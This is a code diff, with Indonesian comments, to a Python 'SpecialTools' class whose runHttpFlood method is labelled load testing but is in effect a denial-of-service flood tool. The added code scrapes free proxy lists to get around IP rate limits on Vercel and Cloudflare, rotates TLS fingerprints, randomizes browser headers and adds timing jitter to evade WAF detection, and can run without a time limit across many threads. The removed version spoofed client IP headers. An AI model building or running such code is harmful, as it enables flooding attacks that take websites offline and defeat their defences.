@@ -45,21 +45,6 @@ class SpecialTools:
         except Exception:
             return False
 
-    def runHttpFlood(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
-        """Menjalankan modul asinkron pengujian beban (HTTP Flood) pada aplikasi web dengan rotasi identitas.
-        
-        Args:
-            targetUrl: URL lengkap web yang diuji.
-            duration: Durasi waktu detik. 0 menandakan konstan tidak terbatas.
-            threads: Paralel pekerja utas jaringan.
-            
-        Returns:
-            String konfirmasi inisialisasi uji beban respon server.
-        """
-        self.isFlooding = True
-        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
-        print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")
-
     # * Alias untuk sinkronisasi dengan Core v6.3.1 (Apex "Nitro" Engine)
     def runNitroStress(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
         """Menjalankan pengujian beban Nitro (Pembungkus HTTP Flood).
@@ -74,55 +59,131 @@ class SpecialTools:
         """
         return self.runHttpFlood(targetUrl, duration, threads)
         
+    def runHttpFlood(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
+        """Menjalankan modul asinkron pengujian beban (HTTP Flood) pada aplikasi web dengan rotasi identitas.
+        
+        Args:
+            targetUrl: URL lengkap web yang diuji.
+            duration: Durasi waktu detik. 0 menandakan konstan tidak terbatas.
+            threads: Paralel pekerja utas jaringan.
+            
+        Returns:
+            String konfirmasi inisialisasi uji beban respon server.
+        """
+        if not targetUrl.startswith("http://") and not targetUrl.startswith("https://"):
+            targetUrl = f"https://{targetUrl}"
+            
+        self.isFlooding = True
+        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
+        
+        # Scrape proxy gratis untuk menembus IP-Rate Limit
+        proxies_list = []
+        try:
+            print("[*] Menginisiasi pengumpulan Proxy untuk Bypass Limit IP Vercel/CF...")
+            proxy_fetch = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
+            if proxy_fetch.status_code == 200:
+                raw_px = proxy_fetch.text.split('\n')
+                proxies_list = [p.strip() for p in raw_px if p.strip()]
+                print(f"[+] Berhasil mengumpulkan {len(proxies_list)} HTTP proxy aktif!")
+        except Exception:
+            print("[-] Gagal mengambil daftar proxy. Melanjutkan serangan mode Jalur Tunggal (Single-IP).")
+        
+        print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")
+
         def attack_worker():
             # * Batas waktu tidak terhingga jika nilai dimasukkan 0
             timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
-            session = requests.Session()
-            request_count = 0
+            
+            try:
+                import tls_client
+                has_tls_client = True
+            except ImportError:
+                has_tls_client = False
+                session = requests.Session()
+                session.verify = False 
+                import urllib3
+                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            
+            # Profil TLS Client yang tersedia untuk merandom JA3 fingerprint
+            tls_profiles = [
+                "chrome_120", "chrome_119", "chrome_118", "chrome_117",
+                "firefox_120", "firefox_119", "firefox_117",
+                "safari_16_0", "safari_15_6_1", "opera_90", "opera_89"
+            ]
             
             while time.time() < timeout and self.isFlooding:
                 if hasattr(self, 'core') and self.core and getattr(self.core, 'stop_requested', False):
                     break
-                
-                # Rotasi penahanan peramban menghindar limitasi soket 
-                request_count += 1
-                if request_count % 500 == 0:
-                    session.close()
-                    session = requests.Session()
-
+                    
                 try:
-                    # Logika Jitter Stealth
-                    time.sleep(random.uniform(0.01, 0.05))
+                    # Variasi jeda yang nyata untuk membodohi rate limiter dinamis (WAF behavior profiling)
+                    time.sleep(random.uniform(0.05, 0.2))
                     
-                    random_str = secrets.token_hex(4)
-                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                    if has_tls_client:
+                        # Buat session TLS baru tiap request dengan fingerprint yang berbeda-beda
+                        client_profile = random.choice(tls_profiles)
+                        tls_session = tls_client.Session(
+                            client_identifier=client_profile,
+                            random_tls_extension_order=True
+                        )
+                        
+                        # Menggunakan Proxy Jika Tersedia
+                        proxy_dict = None
+                        if proxies_list:
+                            rand_px = random.choice(proxies_list)
+                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
+                            tls_session.proxies = proxy_dict
+                            
+                        user_agent = random.choice(self.user_agents)
+                        is_chrome = "Chrome" in user_agent
+                        
+                        headers = {
+                            'User-Agent': user_agent,
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Connection': 'keep-alive',
+                            'Upgrade-Insecure-Requests': '1',
+                            'Sec-Fetch-Dest': 'document',
+                            'Sec-Fetch-Mode': 'navigate',
+                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
+                            'Sec-Fetch-User': '?1',
+                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
+                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
+                        }
+                        # Menghapus elemen kosong (contoh Referer kosong)
+                        headers = {k: v for k, v in headers.items() if v}
+                        
+                        resp = tls_session.get(targetUrl, headers=headers, timeout_seconds=6, allow_redirects=True)
+                        
+                    else:
+                        # Fallback ke request biasa jika tls_client tidak terinstall
+                        proxy_dict = None
+                        if proxies_list:
+                            rand_px = random.choice(proxies_list)
+                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
+                            
+                        user_agent = random.choice(self.user_agents)
+                        is_chrome = "Chrome" in user_agent
+                        
+                        headers = {
+                            'User-Agent': user_agent,
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Connection': 'keep-alive',
+                            'Upgrade-Insecure-Requests': '1',
+                            'Sec-Fetch-Dest': 'document',
+                            'Sec-Fetch-Mode': 'navigate',
+                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
+                            'Sec-Fetch-User': '?1',
+                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
+                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
+                        }
+                        headers = {k: v for k, v in headers.items() if v}
+                        
+                        resp = session.get(targetUrl, headers=headers, proxies=proxy_dict, timeout=6, allow_redirects=True)
                     
-                    headers = {
-                        'User-Agent': random.choice(self.user_agents),
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                        'Accept-Language': 'en-US,en;q=0.5',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Connection': 'keep-alive',
-                        'Upgrade-Insecure-Requests': '1',
-                        'DNT': '1',
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'none',
-                        'Sec-Fetch-User': '?1',
-                        'Sec-CH-UA': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-                        'Sec-CH-UA-Mobile': '?0',
-                        'Sec-CH-UA-Platform': '"Windows"',
-                        'X-Forwarded-For': fake_ip,
-                        'X-Real-IP': fake_ip,
-                        'Cache-Control': 'no-cache',
-                        'Referer': random.choice(self.referers)
-                    }
-                    
-                    connector = '&' if '?' in targetUrl else '?'
-                    test_url = f"{targetUrl}{connector}bypass_cache={random_str}"
-                    
-                    resp = session.get(test_url, headers=headers, timeout=5, allow_redirects=True)
                     
                     code = resp.status_code
                     if code == 200: self.stats["success"] += 1
@@ -132,7 +193,6 @@ class SpecialTools:
                     
                 except Exception:
                     self.stats["error"] += 1
-            session.close()
 
         workers = []
         for _ in range(threads):
